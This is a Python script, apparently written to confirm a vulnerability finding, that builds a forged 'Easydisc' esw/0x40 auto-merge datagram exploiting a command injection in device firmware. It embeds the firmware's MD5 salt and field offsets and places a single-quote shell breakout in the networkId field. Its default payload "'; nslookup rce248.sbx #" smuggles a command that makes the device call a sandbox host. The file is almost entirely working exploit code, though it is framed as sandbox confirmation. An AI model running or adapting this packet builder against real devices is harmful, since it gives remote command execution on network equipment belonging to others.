#!/usr/bin/env python3
"""Build one Easydisc esw/0x40 auto-merge datagram for lab confirmation.

    python3 -I easydisc_pkt.py --cmd "<shell>" [--self-nid NID] [--out pkt.bin]
                              [--salt HEX32] [--sn SN] [--verify known.bin]

The datagram reproduces the structure documented in easydisc-protocol.md:
a 16-byte MD5(SALT || body) prefix over a 460-byte zeroed header whose only
populated fields are msg_type = 0x40, the merge command placed at networkId
(+0x150, the field the merge sink interpolates into a single-quoted
system() template), and the literal "l3" at reserve1 (+0x171) that the esw
hello handler compares to steer the message onto the auto-merge path.

This is for confirming the finding against firmware already in hand, in an
isolated sandbox. --cmd should be a BENIGN breakout (default: a DNS callback
to the sandbox sink, which proves command execution over the network without
touching anything). The networkId slot is 33 bytes (32 chars + NUL), so the
breakout must be <= 32 characters to survive intact.
"""
import argparse
import hashlib
import struct
import sys

SALT = "03251584460325158446032515844600"   # firmware-embedded, byte-identical across builds
HDR = 0x1CC          # 460-byte header
OFF_TYPE = 0x000
OFF_SN = 0x068
OFF_NID = 0x150      # networkId, 33-byte slot
OFF_RES1 = 0x171     # reserve1, compared against "l3"
MSG_TYPE_ESW_HELLO = 0x40


def build(cmd, self_nid="", sn="", salt=SALT, body_len=384):
    cmd_b = cmd.encode()
    if len(cmd_b) > 32:
        sys.exit(f"--cmd is {len(cmd_b)} bytes; networkId slot holds 32 before its NUL")
    body = bytearray(body_len)
    struct.pack_into(">I", body, OFF_TYPE, MSG_TYPE_ESW_HELLO)
    body[OFF_SN:OFF_SN + len(sn)] = sn.encode()[:17]
    body[OFF_NID:OFF_NID + len(cmd_b)] = cmd_b          # the quote-breakout merge command
    body[OFF_RES1:OFF_RES1 + 2] = b"l3"                 # steer onto auto-merge
    prefix = hashlib.md5(salt.encode() + bytes(body)).digest()
    return prefix + bytes(body)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cmd", default="'; nslookup rce248.sbx #",
                    help="benign single-quote breakout placed at networkId (<=32 bytes)")
    ap.add_argument("--self-nid", default="")
    ap.add_argument("--sn", default="")
    ap.add_argument("--salt", default=SALT)
    ap.add_argument("--body-len", type=int, default=384)
    ap.add_argument("--out", default="pkt.bin")
    ap.add_argument("--verify", help="assert the generated bytes equal this file")
    a = ap.parse_args()
    pkt = build(a.cmd, a.self_nid, a.sn, a.salt, a.body_len)
    if a.verify:
        known = open(a.verify, "rb").read()
        ok = pkt == known
        print(f"verify {a.verify}: {'MATCH' if ok else 'DIFFER'} "
              f"({len(pkt)} vs {len(known)} bytes)")
        if not ok:
            sys.exit(1)
    open(a.out, "wb").write(pkt)
    print(f"{a.out}: {len(pkt)} bytes, msg_type=0x40, cmd={a.cmd!r}, "
          f"md5-prefix {pkt[:16].hex()}")


if __name__ == "__main__":
    main()
